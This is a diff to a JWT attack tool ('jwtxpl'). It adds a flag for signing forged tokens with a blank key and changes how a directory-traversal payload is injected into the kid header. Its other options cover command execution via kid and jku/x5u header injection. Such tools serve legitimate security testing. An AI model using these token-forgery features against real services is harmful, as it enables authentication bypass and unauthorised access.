@@ -1,4 +1,4 @@
-#!/usr/local/bin/python3.8
+#!/usr/bin/python3.8
 
 """
     A tool to test the security of JWTs.
@@ -87,7 +87,7 @@ class Cracker:
 
     def __init__(self, token, alg, path_to_key, user_payload, complex_payload, remove_from, add_into, auto_try, kid, exec_via_kid,
                  specified_key, jku_basic, jku_redirect, jku_header_injection, x5u_basic, x5u_header_injection, verify_token_with,
-                 unverified=False, decode=False, manual=False, generate_jwk=False):
+                 unverified=False, blank=False, decode=False, manual=False, generate_jwk=False):
         """
         :param token: The user input token -> str
         :param alg: The algorithm for the attack. HS256 or None -> str
@@ -107,6 +107,7 @@ class Cracker:
         :param x5u_header_injection: The server url vulnerable to HTTP header injection -> str
         :param verify_token_with: The file of the public key to be used for verification -> str
         :param unverified: A flag to set if the script have to act as the host doesn't verify the signature -> Bool
+        :param blank: A flag to set if the key has to be an empty string -> Bool
         :param decode: A flag to set if the user need only to decode the token -> Bool
         :param manual: A flag to set if the user need to craft an url manually -> Bool
         :param generate_jwk: A flag, if present a jwk will be generated and inserted in the token header -> Bool
@@ -138,12 +139,13 @@ class Cracker:
         self.x5u_header_injection = x5u_header_injection
         self.verify_token_with = verify_token_with
         self.unverified = unverified
+        self.blank = blank
         self.decode = decode
         self.manual = manual
         self.generate_jwk = generate_jwk
         """Groups args based on requirements"""
         self.jwks_args = [self.jku_basic, self.jku_redirect, self.jku_header_injection, self.x5u_basic, self.x5u_header_injection, self.generate_jwk]
-        self.cant_asymmetric_args = [self.auto_try, self.kid, self.exec_via_kid, self.specified_key]
+        self.cant_asymmetric_args = [self.auto_try, self.kid, self.exec_via_kid, self.specified_key, self.blank]
         self.require_alg_args = [self.path_to_key] + self.cant_asymmetric_args + self.jwks_args
         """Store a command that need to run in case of x5u injection and open devnull"""
         self.devnull = open(os.devnull, 'wb')
@@ -325,6 +327,8 @@ class Cracker:
                     self.key = "itdoesnotmatter"
                 elif self.specified_key is not None:
                     self.key = self.specified_key
+                elif self.blank:
+                    self.key = ""
                 if self.path_to_key is not None:
                     if not os.path.exists(self.path_to_key):
                         print(f"{Bcolors.FAIL}jwtxpl: err: No such file {self.path_to_key}{Bcolors.ENDC}")
@@ -450,7 +454,10 @@ class Cracker:
             if "kid" not in header_dict.keys():
                 print(f"{Bcolors.FAIL}jwtxpl: err: JWT header has no kid{Bcolors.ENDC}")
                 sys.exit(1)
-            header_dict['kid'] += Cracker.inject_kid(self.kid)
+            if self.kid != "DirTrv":
+                header_dict['kid'] += Cracker.inject_kid(self.kid)
+            elif self.kid == "DirTrv":
+                header_dict['kid'] = Cracker.inject_kid(self.kid)
         elif self.exec_via_kid:
             if "kid" not in header_dict.keys():
                 print(f"{Bcolors.FAIL}jwtxpl: err: JWT header has no kid{Bcolors.ENDC}")
@@ -1474,6 +1481,10 @@ if __name__ == '__main__':
                         help="Just decode the token and quit",
                         required=False
                         )
+    parser.add_argument("-b", "--blank", action="store_true",
+                        help="Set key as a blank string. Only with HS256",
+                        required=False
+                        )
     parser.add_argument("-V", "--verify-token-with",
                         help="The key to verify the token with. Verify and exit",
                         metavar="<keyfile>", required=False
@@ -1545,7 +1556,7 @@ if __name__ == '__main__':
     cracker = Cracker(
         args.token, args.alg, args.key, args.payload, args.complex_payload, args.remove_from, args.add_into, args.auto_try, args.inject_kid,
         args.exec_via_kid, args.specify_key, args.jku_basic, args.jku_redirect, args.jku_inbody, args.x5u_basic, args.x5u_inbody,
-        args.verify_token_with, args.unverified, args.decode, args.manual, args.generate_jwk,
+        args.verify_token_with, args.unverified, args.blank, args.decode, args.manual, args.generate_jwk,
     )
 
     # Start the cracker
